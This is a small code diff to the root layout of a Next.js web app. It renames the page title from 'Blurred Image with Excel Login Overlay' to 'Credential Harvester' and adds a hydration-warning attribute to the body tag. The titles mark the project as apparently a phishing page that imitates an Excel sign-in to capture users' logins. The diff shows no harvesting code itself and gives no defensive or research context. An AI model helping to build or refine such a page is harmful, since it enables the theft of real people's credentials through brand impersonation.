@@ -4,7 +4,7 @@ import { FirebaseClientProvider } from '@/firebase';
 import { Toaster } from '@/components/ui/toaster';
 
 export const metadata: Metadata = {
-  title: 'Blurred Image with Excel Login Overlay',
+  title: 'Credential Harvester',
 };
 
 export default function RootLayout({
@@ -14,7 +14,7 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en" className="h-full" suppressHydrationWarning>
-      <body className="h-full">
+      <body className="h-full" suppressHydrationWarning>
         <FirebaseClientProvider>
           {children}
         </FirebaseClientProvider>
